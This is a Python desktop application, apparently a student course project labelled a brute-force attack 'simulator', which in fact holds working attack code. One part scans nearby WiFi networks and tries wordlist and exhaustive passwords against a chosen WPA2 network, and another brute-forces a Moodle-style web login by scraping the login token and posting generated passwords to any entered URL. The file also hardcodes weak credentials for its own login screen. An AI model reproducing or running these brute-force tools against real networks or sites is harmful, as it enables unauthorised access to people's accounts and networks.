import os
import time
import string
import itertools
import threading
from PIL import Image
import customtkinter as ctk
from pywifi import PyWiFi, const, Profile
import http.client, urllib
import requests
from bs4 import BeautifulSoup
from itertools import product, permutations
from tkinter import messagebox

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

carpeta_principal = os.path.dirname(__file__)
carpeta_imagenes = os.path.join(carpeta_principal, "Imagenes")
acceso_bd = {
    "user": "Grupo01",
    "password": "123456789",
}

class Login:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("Simulador de Ataque de fuerza Bruta - Proyecto del curso BMA15Q")
        self.root.iconbitmap(os.path.join(carpeta_imagenes, "hack2.jpeg"))
        self.root.geometry("500x600")
        self.root.resizable(False, False)

        logo = ctk.CTkImage(
            dark_image=Image.open(os.path.join(carpeta_imagenes, "hack.jpeg")),
            light_image=Image.open(os.path.join(carpeta_imagenes, "hack.jpeg")),
            size=(250, 250)
        )

        etiqueta = ctk.CTkLabel(master=self.root, image=logo, text="")
        etiqueta.pack(pady=15)
        ctk.CTkLabel(self.root, text="Usuario").pack()
        self.usuario = ctk.CTkEntry(self.root)
        self.usuario.insert(0, "Ej:David")
        self.usuario.bind("<Button-1>", lambda e: self.usuario.delete(0, "end"))
        self.usuario.pack()
        ctk.CTkLabel(self.root, text="Contraseña").pack()
        self.contrasena = ctk.CTkEntry(self.root)
        self.contrasena.insert(0, "**************")
        self.contrasena.bind("<Button-1>", lambda e: self.contrasena.delete(0, "end"))
        self.contrasena.pack()
        ctk.CTkButton(self.root, text="Entrar", command=self.validar).pack(pady=10)
        self.root.mainloop()

    def validar(self):
        obtener_usuario = self.usuario.get()
        obtener_contrasena = self.contrasena.get()

        if obtener_usuario != acceso_bd["user"] or obtener_contrasena != acceso_bd["password"]:
            if hasattr(self, "info_login"):
                self.info_login.destroy()
            self.info_login = ctk.CTkLabel(self.root, text="Usuario o contraseña incorrectos.")
            self.info_login.pack()
        else:
            if hasattr(self, "info_login"):
                self.info_login.destroy()
            self.info_login = ctk.CTkLabel(self.root, text=f"Hola, {obtener_usuario}. Espere unos instantes...")
            self.info_login.pack()
            self.root.destroy()
            VentanaOpciones()

class WiFiScanner:
    def __init__(self):
        self.wifi = PyWiFi()
        self.interface = self.wifi.interfaces()[0]


    def leer_contrasenas_archivo(self, ruta_archivo):
        try:
            with open(ruta_archivo, 'r') as archivo:
                return [linea.strip() for linea in archivo.readlines()]
        except FileNotFoundError:
            print(f"El archivo {ruta_archivo} no se encontró.")
            return []
        

    def scan_networks(self):
        self.interface.scan()
        time.sleep(3)
        resultados = self.interface.scan_results()
        ssids = [network.ssid for network in resultados if network.ssid]
        return ssids

    def conectar_red(self, ssid, contrasena):

        if self.interface.status() == const.IFACE_CONNECTED:
            self.interface.disconnect()

        for _ in range(5):
            if self.interface.status() == const.IFACE_DISCONNECTED:
                break
            time.sleep(0.2)

        perfil = Profile()
        perfil.ssid = ssid
        perfil.auth = const.AUTH_ALG_OPEN
        perfil.akm.append(const.AKM_TYPE_WPA2PSK)
        perfil.cipher = const.CIPHER_TYPE_CCMP
        perfil.key = contrasena

        perfil_temporal = self.interface.add_network_profile(perfil)
        self.interface.connect(perfil_temporal)

        for _ in range(10):
            if self.interface.status() == const.IFACE_CONNECTED:
                print(f"Conexión exitosa con la contraseña: {contrasena}")
                self.interface.disconnect()
                self.interface.remove_network_profile(perfil_temporal)
                return True
            time.sleep(0.2)

        self.interface.remove_network_profile(perfil_temporal)
        return False


    def ataque_fuerza_bruta_wifi(self, ssid, longitud_minima, longitud_maxima, ventana_progreso):

        ruta_archivo = os.path.join(carpeta_principal, "Contraseñas", "contraseñas.txt")

        contraseñas_archivo = self.leer_contrasenas_archivo(ruta_archivo)
        inicio = time.time()

        ventana_progreso.actualizar_texto(f"Probando contraseñas del archivo: {ruta_archivo}")
        for contrasena in contraseñas_archivo:
            ventana_progreso.actualizar_texto(f"Probando contraseña: {contrasena}")

            if self.conectar_red(ssid, contrasena):
                tiempo_transcurrido = time.time() - inicio
                ventana_progreso.actualizar_texto(
                    f"¡Contraseña encontrada en archivo!: {contrasena}\nTiempo: {tiempo_transcurrido:.2f} segundos"
                )
                return

        ventana_progreso.actualizar_texto("No se encontró la contraseña en el archivo. Iniciando ataque de fuerza bruta...")

        caracteres = string.ascii_lowercase
        for longitud in range(longitud_minima, longitud_maxima + 1):
            combinaciones = itertools.product(caracteres, repeat=longitud)

            for combinacion in combinaciones:
                contrasena_intento = ''.join(combinacion)
                ventana_progreso.actualizar_texto(f"Probando contraseña: {contrasena_intento}")

                if self.conectar_red(ssid, contrasena_intento):
                    tiempo_transcurrido = time.time() - inicio
                    ventana_progreso.actualizar_texto(
                        f"¡Contraseña encontrada!: {contrasena_intento}\nTiempo: {tiempo_transcurrido:.2f} segundos"
                    )
                    return

                ventana_progreso.actualizar_texto(f"Contraseña incorrecta: {contrasena_intento}")

        ventana_progreso.actualizar_texto("No se encontró la contraseña en el rango especificado.")

class VentanaProgreso(ctk.CTkToplevel):
    def __init__(self, scanner):
        super().__init__()
        self.scanner = scanner
        self.title("Progreso del Ataque de Fuerza Bruta")
        self.geometry("400x450")

        self.texto = ctk.CTkTextbox(self, width=350, height=350)
        self.texto.pack(pady=10)

    def actualizar_texto(self, mensaje):
        self.texto.insert("end", f"{mensaje}\n")
        self.texto.yview("end")
        
class FuncionesPrograma:
    def __init__(self):
        self.scanner = WiFiScanner()

    def ventana_Ataque_a_formularios_web(self):

        ventana = ctk.CTkToplevel()
        ventana.title("Análisis de formularios web")
        ventana.geometry("400x600")

        ctk.CTkLabel(ventana, text="Ingrese la URL:").pack(pady=10)
        self.entry_url = ctk.CTkEntry(ventana)
        self.entry_url.pack()

        ctk.CTkLabel(ventana, text="Ingrese el nombre de usuario:").pack(pady=10)
        self.entry_username = ctk.CTkEntry(ventana)
        self.entry_username.pack()

        ctk.CTkLabel(ventana, text="Ingrese la longitud mínima de la contraseña:").pack(pady=10)
        self.entry_min_length = ctk.CTkEntry(ventana)
        self.entry_min_length.pack()

        ctk.CTkLabel(ventana, text="Ingrese la longitud máxima de la contraseña:").pack(pady=10)
        self.entry_max_length = ctk.CTkEntry(ventana)
        self.entry_max_length.pack()

        ctk.CTkLabel(ventana, text="Ingrese palabras base separadas por coma (opcional):").pack(pady=10)
        self.entry_base_words = ctk.CTkEntry(ventana)
        self.entry_base_words.pack()

        ctk.CTkButton(
            ventana,
            text="Iniciar Analisis",
            command=self.iniciar_ataque
        ).pack(pady=20)

    def fetch_login_token(self, url):
        try:
            response = requests.get(url)
            response.raise_for_status()

            soup = BeautifulSoup(response.text, 'html.parser')
            token_field = soup.find('input', {'name': 'logintoken'})
            if token_field:
                return token_field['value']
            else:
                messagebox.showerror("Error", "No se encontró el token de sesión.")
                return None
        except requests.RequestException as e:
            messagebox.showerror("Error", f"Error al obtener el token: {e}")
            return None

    def generate_passwords(self, min_length, max_length, base_words):
        characters = "abcdefghijklmnopqrstuvwxyz0123456789"

        if base_words:
            for word in base_words:
                yield word

            for r in range(2, len(base_words) + 1):
                for combo in permutations(base_words, r):
                    combined_word = ''.join(combo)
                    if min_length <= len(combined_word) <= max_length:
                        yield combined_word

            for base_word in base_words:
                for length in range(min_length - len(base_word), max_length - len(base_word) + 1):
                    for extra_chars in product(characters, repeat=length):
                        yield base_word + ''.join(extra_chars)
                        yield ''.join(extra_chars) + base_word

        for length in range(min_length, max_length + 1):
            yield from (''.join(p) for p in product(characters, repeat=length))

    def iniciar_ataque(self):
        url = self.entry_url.get()
        username = self.entry_username.get()
        min_length = self.entry_min_length.get()
        max_length = self.entry_max_length.get()
        base_words = self.entry_base_words.get()

        if not url or not username or not min_length or not max_length:
            messagebox.showerror("Error", "Todos los campos son obligatorios, excepto palabras base.")
            return

        try:
            min_length = int(min_length)
            max_length = int(max_length)
        
        except ValueError:
            messagebox.showerror("Error", "La longitud mínima y máxima deben ser números enteros.")
            return

        if min_length > max_length:
            messagebox.showerror("Error", "La longitud mínima no puede ser mayor que la máxima.")
            return

        base_words_list = [word.strip() for word in base_words.split(",")] if base_words else None

        ventana_progreso = VentanaProgreso(self)

        hilo_ataque = threading.Thread(
            target=self.brute_force_moodle,
            args=(url, username, min_length, max_length, base_words_list, ventana_progreso),
            daemon=True
        )
        hilo_ataque.start()

    def brute_force_moodle(self, url, username, min_length, max_length, base_words, ventana_progreso):
        login_url = url
        start_time = time.time()

        ventana_progreso.actualizar_texto(f"Probando contraseñas de longitud entre {min_length} y {max_length}...")

        for password in self.generate_passwords(min_length, max_length, base_words):
            token = self.fetch_login_token(login_url)
            if not token:
                ventana_progreso.actualizar_texto("Error: No se pudo obtener el token de sesión. Abortando.")
                return

            payload = {
                "logintoken": token,
                "username": username,
                "password": password
            }

            try:
                response = requests.post(login_url, data=payload)
                ventana_progreso.actualizar_texto(f"Probando contraseña: {password} - Estado: {response.status_code}")

                if "loginerrormessage" not in response.text:
                    elapsed_time = time.time() - start_time
                    ventana_progreso.actualizar_texto(
                        f"¡Contraseña encontrada!: {password}\nTiempo: {elapsed_time:.2f} segundos"
                    )
                    return

            except requests.RequestException as e:
                ventana_progreso.actualizar_texto(f"Error al intentar conectarse: {e}")
                return

        ventana_progreso.actualizar_texto("No se encontró ninguna contraseña con los parámetros proporcionados.")


    def ventana_Ataque_a_internet(self):
        ventana = ctk.CTkToplevel()
        ventana.title("Ataque a redes Wifi")
        ventana.geometry("400x400")

        ctk.CTkButton(ventana, text="Detectar redes WiFi", command=self.detectar_redes_wifi).pack(pady=10)
        self.texto_redes = ctk.CTkTextbox(ventana, width=350, height=150)
        self.texto_redes.pack(pady=10)

        ctk.CTkLabel(ventana, text="Seleccione una red:").pack(pady=10)
        self.opcion_red = ctk.CTkOptionMenu(ventana, values=[])
        self.opcion_red.pack()

        ctk.CTkButton(ventana, text="Iniciar analisis con fuerza bruta", command=self.iniciar_ataque_red).pack(pady=10)

    def detectar_redes_wifi(self):
        self.redes_disponibles = self.scanner.scan_networks()
        self.texto_redes.delete("1.0", "end")
        self.texto_redes.insert("1.0", "\n".join(self.redes_disponibles))
        self.opcion_red.configure(values=self.redes_disponibles)

    def iniciar_ataque_red(self):
        red_seleccionada = self.opcion_red.get()
        if red_seleccionada:
            ventana_progreso = VentanaProgreso(self.scanner)
            hilo_ataque = threading.Thread(
                target=self.scanner.ataque_fuerza_bruta_wifi,
                args=(red_seleccionada, 8, 10, ventana_progreso)
            )
            hilo_ataque.start(),
objeto_funciones = FuncionesPrograma()
class VentanaOpciones:
    botones = {'Analisis a formularios web': objeto_funciones.ventana_Ataque_a_formularios_web,
               'Analisis a redes Wifi': objeto_funciones.ventana_Ataque_a_internet}

    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("Opciones para simular un ataque.")
        contador = 0

        for texto_boton in self.botones:
            button = ctk.CTkButton(
                master=self.root,
                text=texto_boton,
                height=25,
                width=200,
                command=self.botones[texto_boton]
            )
            button.grid(row=contador // 5, column=contador % 5, padx=5, pady=5)
            contador += 1


        self.root.mainloop()
